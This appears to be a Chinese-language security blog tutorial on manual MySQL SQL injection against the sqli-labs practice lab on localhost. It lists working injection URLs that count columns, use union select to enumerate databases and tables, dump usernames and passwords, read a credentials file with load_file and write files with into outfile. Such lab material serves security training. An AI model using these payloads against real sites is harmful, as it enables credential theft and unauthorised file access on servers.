---
layout: post
title: "1.1.1-SQL注入-SQL注入基础-SQL手工注入方法"
date: 2018-06-11
category: web安全
tags: sql注入 
---
## MySQL手工注入
### 01 MySQL数据库结构

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/01.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/02.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/03.jpg)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/04.png)

核心原理：  
MySql内置的infromation_schema库，它功能强大，是我们进行MySql注入的基石！  
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/05.png)

	select schema_name from information_schema.schemata // 查库
	select table_name from information_schema.tables where table_schema=库名 // 查表
	select column_name from information_schema.columns where table_name=表名 // 查列
	select 列名 from 库名.表名 // 查数据
	
	
	select column_name from information_schema.columns where table_name=0x7573657273;
	
	
	![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/06.png)
	
	select group_concat(schema_name) from information_schema.schemata;
	select username,password from security.users limit 0,1;
	
---

### 02 MySQL手工注入方法

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/07.jpg)

	http://127.0.0.1/Less-1/?id=2
	http://127.0.0.1/Less-1/?id=2' 注入点
	http://127.0.0.1/Less-1/?id=2' and '1'='1 正常
	http://127.0.0.1/Less-1/?id=2' and '1'='2 报错
	
	http://127.0.0.1/Less-1/?id=2' order by 3--+ 判断字段长度
	http://127.0.0.1/Less-1/?id=2' order by 4--+ 返回错误
	
	http://127.0.0.1/Less-1/?id=2' union select 1,2,3--+
	http://127.0.0.1/Less-1/?id=-1' union select 1,2,3--+ 判断数据显示位置
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+ 提示more than 1 row 查询库名
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+ 当前库
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select concat_ws('~',username,password) from security.users limit 0,1)--+
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select database())--+
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select load_file('/var/www/html/sql-connections/db-creds.inc'))--+ 读文件
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select 'test' into outfile '/var/www/html/sql-connections/t.txt')--+ 写文件
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select 'test' into outfile '/tmp/t.txt')--+ 写文件
	
	
	
http://127.0.0.1:90/Less-1/

	


